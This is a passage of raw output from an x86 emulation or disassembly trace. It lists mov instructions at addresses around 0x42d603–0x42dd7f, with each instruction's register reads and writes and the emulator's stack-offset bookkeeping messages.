and offset 0x7f64 for stack size 0x10000 0x42d603: mov ecx, dword ptr [ebp - 0xd0], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7f30 for stack size 0x10000 0x42d610: mov dword ptr [ebp - 0x9c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f64 for stack size 0x10000 saving data to stack: 0 4 0x42d61b: mov dword ptr [ebp - 0xd0], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f30 for stack size 0x10000 saving data to stack: 0 4 0x42d621: mov edi, eax, regs_read: [19], regs_write: [23] 0x42d633: mov eax, dword ptr [ebp - 0xe4], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f1c for stack size 0x10000 0x42d63b: mov ecx, dword ptr [ebp - 0xf4], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7f0c for stack size 0x10000 0x42d643: mov dword ptr [ebp - 0xe4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f1c for stack size 0x10000 saving data to stack: 0 4 0x42d64b: mov dword ptr [ebp - 0x110], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ef0 for stack size 0x10000 saving data to stack: 0 4 0x42d651: mov dword ptr [ebp - 0xf4], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f0c for stack size 0x10000 saving data to stack: 0 4 0x42d65b: mov dword ptr [ebp - 0x120], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ee0 for stack size 0x10000 saving data to stack: 0 4 0x42d661: mov edx, ecx, regs_read: [22], regs_write: [24] 0x42d670: mov dword ptr [ebp - 0x128], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ed8 for stack size 0x10000 saving data to stack: 0 4 0x42d678: mov edx, dword ptr [ebp - 0xe0], regs_read: [20], regs_write: [24] adjusting stack for ESP 0x0 and offset 0x7f20 for stack size 0x10000 0x42d67e: mov dword ptr [ebp - 0x130], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ed0 for stack size 0x10000 saving data to stack: 0 4 0x42d684: mov eax, dword ptr [ebp - 0xa0], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f60 for stack size 0x10000 0x42d68d: mov ebx, dword ptr [ebp - 0xfc], regs_read: [20], regs_write: [21] adjusting stack for ESP 0x0 and offset 0x7f04 for stack size 0x10000 0x42d69c: mov dword ptr [ebp - 0xa0], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f60 for stack size 0x10000 saving data to stack: 0 4 0x42d6ae: mov edi, edx, regs_read: [24], regs_write: [23] 0x42d6b6: mov dword ptr [ebp - 0xe0], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f20 for stack size 0x10000 saving data to stack: 0 4 0x42d6c0: mov eax, dword ptr [ebp - 0xf0], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f10 for stack size 0x10000 0x42d6c8: mov dword ptr [ebp - 0xf0], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f10 for stack size 0x10000 saving data to stack: 0 4 0x42d6d6: mov ecx, ebx, regs_read: [21], regs_write: [22] 0x42d6d8: mov dword ptr [ebp - 0xfc], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f04 for stack size 0x10000 saving data to stack: 0 4 0x42d6e4: mov ebx, eax, regs_read: [19], regs_write: [21] 0x42d6f4: mov eax, dword ptr [ebp - 0xa0], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f60 for stack size 0x10000 0x42d6fc: mov ecx, dword ptr [ebp - 0xe0], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7f20 for stack size 0x10000 0x42d70c: mov dword ptr [ebp - 0xa0], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f60 for stack size 0x10000 saving data to stack: 0 4 0x42d717: mov dword ptr [ebp - 0xe0], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f20 for stack size 0x10000 saving data to stack: 0 4 0x42d71d: mov edi, eax, regs_read: [19], regs_write: [23] 0x42d72f: mov eax, dword ptr [ebp - 0xf0], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f10 for stack size 0x10000 0x42d737: mov ecx, dword ptr [ebp - 0xfc], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7f04 for stack size 0x10000 0x42d73f: mov dword ptr [ebp - 0xf0], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f10 for stack size 0x10000 saving data to stack: 0 4 0x42d747: mov dword ptr [ebp - 0x140], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ec0 for stack size 0x10000 saving data to stack: 0 4 0x42d74f: mov dword ptr [ebp - 0xfc], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f04 for stack size 0x10000 saving data to stack: 0 4 0x42d757: mov dword ptr [ebp - 0x10c], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ef4 for stack size 0x10000 saving data to stack: 0 4 0x42d75d: mov edi, ecx, regs_read: [22], regs_write: [23] 0x42d76c: mov ecx, dword ptr [ebp - 0xac], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7f54 for stack size 0x10000 0x42d774: mov eax, dword ptr [ebp - 0xa8], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f58 for stack size 0x10000 0x42d784: mov dword ptr [ebp - 0xa8], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f58 for stack size 0x10000 saving data to stack: 0 4 0x42d795: mov ebx, ecx, regs_read: [22], regs_write: [21] 0x42d79f: mov eax, dword ptr [ebp - 0xe4], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f1c for stack size 0x10000 0x42d7a7: mov dword ptr [ebp - 0xac], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f54 for stack size 0x10000 saving data to stack: 0 4 0x42d7ad: mov ecx, dword ptr [ebp - 0xf4], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7f0c for stack size 0x10000 0x42d7b3: mov dword ptr [ebp - 0xe4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f1c for stack size 0x10000 saving data to stack: 0 4 0x42d7bd: mov edi, eax, regs_read: [19], regs_write: [23] 0x42d7bf: mov dword ptr [ebp - 0xf4], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f0c for stack size 0x10000 saving data to stack: 0 4 0x42d7d5: mov eax, dword ptr [ebp - 0xa8], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f58 for stack size 0x10000 0x42d7dd: mov ecx, dword ptr [ebp - 0xac], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7f54 for stack size 0x10000 0x42d7ea: mov dword ptr [ebp - 0xa8], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f58 for stack size 0x10000 saving data to stack: 0 4 0x42d7f5: mov dword ptr [ebp - 0xac], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f54 for stack size 0x10000 saving data to stack: 0 4 0x42d7ff: mov esi, eax, regs_read: [19], regs_write: [29] 0x42d80d: mov eax, dword ptr [ebp - 0xe4], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f1c for stack size 0x10000 0x42d815: mov ecx, dword ptr [ebp - 0xf4], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7f0c for stack size 0x10000 0x42d81d: mov dword ptr [ebp - 0xe4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f1c for stack size 0x10000 saving data to stack: 0 4 0x42d825: mov dword ptr [ebp - 0x100], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f00 for stack size 0x10000 saving data to stack: 0 4 0x42d82d: mov dword ptr [ebp - 0xf4], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f0c for stack size 0x10000 saving data to stack: 0 4 0x42d835: mov ebx, dword ptr [ebp - 0xfc], regs_read: [20], regs_write: [21] adjusting stack for ESP 0x0 and offset 0x7f04 for stack size 0x10000 0x42d83b: mov edi, dword ptr [ebp - 0x94], regs_read: [20], regs_write: [23] adjusting stack for ESP 0x0 and offset 0x7f6c for stack size 0x10000 0x42d841: mov edx, ecx, regs_read: [22], regs_write: [24] 0x42d84c: mov dword ptr [ebp - 0x90], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f70 for stack size 0x10000 saving data to stack: 0 4 0x42d858: mov dword ptr [ebp - 0x11c], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ee4 for stack size 0x10000 saving data to stack: 0 4 0x42d85e: mov dword ptr [ebp - 0x13c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ec4 for stack size 0x10000 saving data to stack: 0 4 0x42d864: mov eax, dword ptr [ebp - 0xc0], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f40 for stack size 0x10000 0x42d879: mov dword ptr [ebp - 0xc0], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f40 for stack size 0x10000 saving data to stack: 0 4 0x42d88c: mov dword ptr [ebp - 0x94], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f6c for stack size 0x10000 saving data to stack: 0 4 0x42d898: mov eax, dword ptr [ebp - 0xf0], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f10 for stack size 0x10000 0x42d8a0: mov dword ptr [ebp - 0xf0], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f10 for stack size 0x10000 saving data to stack: 0 4 0x42d8ae: mov ecx, ebx, regs_read: [21], regs_write: [22] 0x42d8b0: mov dword ptr [ebp - 0xfc], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f04 for stack size 0x10000 saving data to stack: 0 4 0x42d8bc: mov ebx, eax, regs_read: [19], regs_write: [21] 0x42d8cc: mov eax, dword ptr [ebp - 0xc0], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f40 for stack size 0x10000 0x42d8d4: mov ecx, dword ptr [ebp - 0x94], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7f6c for stack size 0x10000 0x42d8e1: mov dword ptr [ebp - 0xc0], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f40 for stack size 0x10000 saving data to stack: 0 4 0x42d8ec: mov edi, eax, regs_read: [19], regs_write: [23] 0x42d8ee: mov dword ptr [ebp - 0x94], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f6c for stack size 0x10000 saving data to stack: 0 4 0x42d904: mov eax, dword ptr [ebp - 0xf0], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f10 for stack size 0x10000 0x42d90c: mov ecx, dword ptr [ebp - 0xfc], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7f04 for stack size 0x10000 0x42d914: mov dword ptr [ebp - 0xf0], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f10 for stack size 0x10000 saving data to stack: 0 4 0x42d91c: mov dword ptr [ebp - 0x124], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7edc for stack size 0x10000 saving data to stack: 0 4 0x42d924: mov dword ptr [ebp - 0xfc], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f04 for stack size 0x10000 saving data to stack: 0 4 0x42d92c: mov dword ptr [ebp - 0xa4], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f5c for stack size 0x10000 saving data to stack: 0 4 0x42d932: mov edx, ecx, regs_read: [22], regs_write: [24] 0x42d934: mov ebx, dword ptr [ebp - 0xbc], regs_read: [20], regs_write: [21] adjusting stack for ESP 0x0 and offset 0x7f44 for stack size 0x10000 0x42d949: mov dword ptr [ebp - 0xe8], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f18 for stack size 0x10000 saving data to stack: 0 4 0x42d94f: mov edx, dword ptr [ebp - 0xd0], regs_read: [20], regs_write: [24] adjusting stack for ESP 0x0 and offset 0x7f30 for stack size 0x10000 0x42d955: mov dword ptr [ebp - 0x114], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7eec for stack size 0x10000 saving data to stack: 0 4 0x42d95b: mov eax, dword ptr [ebp - 0x9c], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f64 for stack size 0x10000 0x42d970: mov dword ptr [ebp - 0x9c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f64 for stack size 0x10000 saving data to stack: 0 4 0x42d97f: mov edi, edx, regs_read: [24], regs_write: [23] 0x42d987: mov dword ptr [ebp - 0xd0], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f30 for stack size 0x10000 saving data to stack: 0 4 0x42d991: mov eax, dword ptr [ebp - 0xc8], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f38 for stack size 0x10000 0x42d999: mov dword ptr [ebp - 0xc8], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f38 for stack size 0x10000 saving data to stack: 0 4 0x42d9a7: mov ecx, ebx, regs_read: [21], regs_write: [22] 0x42d9a9: mov dword ptr [ebp - 0xbc], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f44 for stack size 0x10000 saving data to stack: 0 4 0x42d9b5: mov ebx, eax, regs_read: [19], regs_write: [21] 0x42d9c5: mov eax, dword ptr [ebp - 0x9c], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f64 for stack size 0x10000 0x42d9cd: mov ecx, dword ptr [ebp - 0xd0], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7f30 for stack size 0x10000 0x42d9da: mov dword ptr [ebp - 0x9c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f64 for stack size 0x10000 saving data to stack: 0 4 0x42d9e5: mov dword ptr [ebp - 0xd0], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f30 for stack size 0x10000 saving data to stack: 0 4 0x42d9eb: mov edi, eax, regs_read: [19], regs_write: [23] 0x42d9fd: mov eax, dword ptr [ebp - 0xc8], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f38 for stack size 0x10000 0x42da07: mov dword ptr [ebp - 0x10c], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ef4 for stack size 0x10000 saving data to stack: 0 4 0x42da0d: mov dword ptr [ebp - 0xb4], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f4c for stack size 0x10000 saving data to stack: 0 4 0x42da13: mov dword ptr [ebp - 0xc8], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f38 for stack size 0x10000 saving data to stack: 0 4 0x42da19: mov ecx, dword ptr [ebp - 0xbc], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7f44 for stack size 0x10000 0x42da23: mov dword ptr [ebp - 0xbc], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f44 for stack size 0x10000 saving data to stack: 0 4 0x42da2b: mov edx, ecx, regs_read: [22], regs_write: [24] 0x42da2d: mov ebx, dword ptr [ebp - 0xb0], regs_read: [20], regs_write: [21] adjusting stack for ESP 0x0 and offset 0x7f50 for stack size 0x10000 0x42da42: mov dword ptr [ebp - 0xec], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f14 for stack size 0x10000 saving data to stack: 0 4 0x42da48: mov edx, dword ptr [ebp - 0xe0], regs_read: [20], regs_write: [24] adjusting stack for ESP 0x0 and offset 0x7f20 for stack size 0x10000 0x42da4e: mov dword ptr [ebp - 0x108], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ef8 for stack size 0x10000 saving data to stack: 0 4 0x42da54: mov eax, dword ptr [ebp - 0xa0], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f60 for stack size 0x10000 0x42da69: mov dword ptr [ebp - 0xa0], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f60 for stack size 0x10000 saving data to stack: 0 4 0x42da78: mov edi, edx, regs_read: [24], regs_write: [23] 0x42da80: mov dword ptr [ebp - 0xe0], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f20 for stack size 0x10000 saving data to stack: 0 4 0x42da8a: mov eax, dword ptr [ebp - 0xb8], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f48 for stack size 0x10000 0x42da92: mov dword ptr [ebp - 0xb8], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f48 for stack size 0x10000 saving data to stack: 0 4 0x42daa0: mov ecx, ebx, regs_read: [21], regs_write: [22] 0x42daa2: mov dword ptr [ebp - 0xb0], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 4 0x42daae: mov ebx, eax, regs_read: [19], regs_write: [21] 0x42dabe: mov eax, dword ptr [ebp - 0xa0], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f60 for stack size 0x10000 0x42dac6: mov ecx, dword ptr [ebp - 0xe0], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7f20 for stack size 0x10000 0x42dad3: mov dword ptr [ebp - 0xa0], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f60 for stack size 0x10000 saving data to stack: 0 4 0x42dade: mov dword ptr [ebp - 0xe0], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f20 for stack size 0x10000 saving data to stack: 0 4 0x42dae4: mov edi, eax, regs_read: [19], regs_write: [23] 0x42daf6: mov eax, dword ptr [ebp - 0xb8], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f48 for stack size 0x10000 0x42dafe: mov ecx, dword ptr [ebp - 0xb0], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7f50 for stack size 0x10000 0x42db06: mov dword ptr [ebp - 0xb8], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f48 for stack size 0x10000 saving data to stack: 0 4 0x42db10: mov dword ptr [ebp - 0xb0], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 4 0x42db18: mov ebx, dword ptr [ebp - 0x114], regs_read: [20], regs_write: [21] adjusting stack for ESP 0x0 and offset 0x7eec for stack size 0x10000 0x42db1e: mov esi, ecx, regs_read: [22], regs_write: [29] 0x42db2b: mov eax, dword ptr [ebp - 0xa8], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f58 for stack size 0x10000 0x42db31: mov dword ptr [ebp - 0x110], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ef0 for stack size 0x10000 saving data to stack: 0 4 0x42db3b: mov ecx, dword ptr [ebp - 0xe8], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7f18 for stack size 0x10000 0x42db41: mov dword ptr [ebp - 0x120], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ee0 for stack size 0x10000 saving data to stack: 0 4 0x42db49: mov esi, dword ptr [ebp - 0xac], regs_read: [20], regs_write: [29] adjusting stack for ESP 0x0 and offset 0x7f54 for stack size 0x10000 0x42db54: mov dword ptr [ebp - 0xa8], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f58 for stack size 0x10000 saving data to stack: 0 4 0x42db61: mov dword ptr [ebp - 0xac], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f54 for stack size 0x10000 saving data to stack: 0 4 0x42db6b: mov edx, dword ptr [ebp - 0xc8], regs_read: [20], regs_write: [24] adjusting stack for ESP 0x0 and offset 0x7f38 for stack size 0x10000 0x42db71: mov esi, dword ptr [ebp - 0xbc], regs_read: [20], regs_write: [29] adjusting stack for ESP 0x0 and offset 0x7f44 for stack size 0x10000 0x42db79: mov dword ptr [ebp - 0xc8], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f38 for stack size 0x10000 saving data to stack: 0 4 0x42db85: mov dword ptr [ebp - 0xbc], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f44 for stack size 0x10000 saving data to stack: 0 4 0x42db8b: mov esi, dword ptr [ebp - 0x38], regs_read: [20], regs_write: [29] adjusting stack for ESP 0x0 and offset 0x7fc8 for stack size 0x10000 0x42db8e: mov edx, ecx, regs_read: [22], regs_write: [24] 0x42db9c: mov dword ptr [ebp - 0xe8], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f18 for stack size 0x10000 saving data to stack: 0 4 0x42dba4: mov dword ptr [ebp - 0x88], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f78 for stack size 0x10000 saving data to stack: 0 4 0x42dbb0: mov ebx, ecx, regs_read: [22], regs_write: [21] 0x42dbc1: mov esi, dword ptr [ebp - 0xac], regs_read: [20], regs_write: [29] adjusting stack for ESP 0x0 and offset 0x7f54 for stack size 0x10000 0x42dbd5: mov dword ptr [ebp - 0x114], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7eec for stack size 0x10000 saving data to stack: 0 4 0x42dbdb: mov ebx, edi, regs_read: [23], regs_write: [21] 0x42dbe7: mov dword ptr [ebp - 0xa8], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f58 for stack size 0x10000 saving data to stack: 0 4 0x42dbf1: mov esi, dword ptr [ebp - 0x94], regs_read: [20], regs_write: [29] adjusting stack for ESP 0x0 and offset 0x7f6c for stack size 0x10000 0x42dbf7: mov edi, dword ptr [ebp - 0xa8], regs_read: [20], regs_write: [23] adjusting stack for ESP 0x0 and offset 0x7f58 for stack size 0x10000 0x42dbff: mov dword ptr [ebp - 0x144], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ebc for stack size 0x10000 saving data to stack: 0 4 0x42dc0b: mov dword ptr [ebp - 0xa8], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f58 for stack size 0x10000 saving data to stack: 0 4 0x42dc1b: mov dword ptr [ebp - 0x138], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ec8 for stack size 0x10000 saving data to stack: 0 4 0x42dc21: mov edi, dword ptr [ebp - 0xec], regs_read: [20], regs_write: [23] adjusting stack for ESP 0x0 and offset 0x7f14 for stack size 0x10000 0x42dc27: mov eax, edx, regs_read: [24], regs_write: [19] 0x42dc32: mov dword ptr [ebp - 0x130], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ed0 for stack size 0x10000 saving data to stack: 0 4 0x42dc38: mov ebx, dword ptr [ebp - 0x108], regs_read: [20], regs_write: [21] adjusting stack for ESP 0x0 and offset 0x7ef8 for stack size 0x10000 0x42dc40: mov ecx, dword ptr [ebp - 0x100], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7f00 for stack size 0x10000 0x42dc46: mov dword ptr [ebp - 0xdc], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f24 for stack size 0x10000 saving data to stack: 0 4 0x42dc50: mov edx, dword ptr [ebp - 0x90], regs_read: [20], regs_write: [24] adjusting stack for ESP 0x0 and offset 0x7f70 for stack size 0x10000 0x42dc56: mov dword ptr [ebp - 0x98], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f68 for stack size 0x10000 saving data to stack: 0 4 0x42dc5c: mov eax, dword ptr [ebp - 0xc0], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f40 for stack size 0x10000 0x42dc69: mov dword ptr [ebp - 0xc0], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f40 for stack size 0x10000 saving data to stack: 0 4 0x42dc7a: mov dword ptr [ebp - 0x90], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f70 for stack size 0x10000 saving data to stack: 0 4 0x42dc80: mov ecx, dword ptr [ebp - 0xb8], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7f48 for stack size 0x10000 0x42dc88: mov edx, dword ptr [ebp - 0xb0], regs_read: [20], regs_write: [24] adjusting stack for ESP 0x0 and offset 0x7f50 for stack size 0x10000 0x42dc90: mov dword ptr [ebp - 0xb8], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f48 for stack size 0x10000 saving data to stack: 0 4 0x42dc98: mov dword ptr [ebp - 0xb0], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 4 0x42dca2: mov edx, edi, regs_read: [23], regs_write: [24] 0x42dcb2: mov ebx, ecx, regs_read: [22], regs_write: [21] 0x42dcb7: mov edi, edx, regs_read: [24], regs_write: [23] 0x42dcc2: mov dword ptr [ebp - 0x12c], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ed4 for stack size 0x10000 saving data to stack: 0 4 0x42dcd2: mov dword ptr [ebp - 0x104], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP 0x0 and offset 0x7efc for stack size 0x10000 saving data to stack: 0 4 0x42dcd8: mov edi, dword ptr [ebp - 0x90], regs_read: [20], regs_write: [23] adjusting stack for ESP 0x0 and offset 0x7f70 for stack size 0x10000 0x42dcde: mov ebx, edi, regs_read: [23], regs_write: [21] 0x42dcec: mov dword ptr [ebp - 0x90], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f70 for stack size 0x10000 saving data to stack: 0 4 0x42dcf4: mov esi, dword ptr [ebp - 0x120], regs_read: [20], regs_write: [29] adjusting stack for ESP 0x0 and offset 0x7ee0 for stack size 0x10000 0x42dd00: mov eax, edi, regs_read: [23], regs_write: [19] 0x42dd02: mov dword ptr [ebp - 0xe8], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f18 for stack size 0x10000 saving data to stack: 0 4 0x42dd0e: mov dword ptr [ebp - 0xc0], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f40 for stack size 0x10000 saving data to stack: 0 4 0x42dd1e: mov dword ptr [ebp - 0xc8], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f38 for stack size 0x10000 saving data to stack: 0 4 0x42dd24: mov ebx, dword ptr [ebp - 0x110], regs_read: [20], regs_write: [21] adjusting stack for ESP 0x0 and offset 0x7ef0 for stack size 0x10000 0x42dd2a: mov eax, edx, regs_read: [24], regs_write: [19] 0x42dd37: mov ecx, dword ptr [ebp - 0xd0], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7f30 for stack size 0x10000 0x42dd3d: mov dword ptr [ebp - 0x90], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f70 for stack size 0x10000 saving data to stack: 0 4 0x42dd47: mov edx, dword ptr [ebp - 0xa4], regs_read: [20], regs_write: [24] adjusting stack for ESP 0x0 and offset 0x7f5c for stack size 0x10000 0x42dd4d: mov dword ptr [ebp - 0xc4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f3c for stack size 0x10000 saving data to stack: 0 4 0x42dd53: mov eax, dword ptr [ebp - 0x9c], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f64 for stack size 0x10000 0x42dd60: mov dword ptr [ebp - 0x9c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f64 for stack size 0x10000 saving data to stack: 0 4 0x42dd69: mov dword ptr [ebp - 0xd0], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f30 for stack size 0x10000 saving data to stack: 0 4 0x42dd6f: mov ecx, dword ptr [ebp - 0x124], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7edc for stack size 0x10000 0x42dd7f: mov dword ptr [ebp - 0xa4], edx, regs_read: [20, 24], regs_write: () adjusting stack for 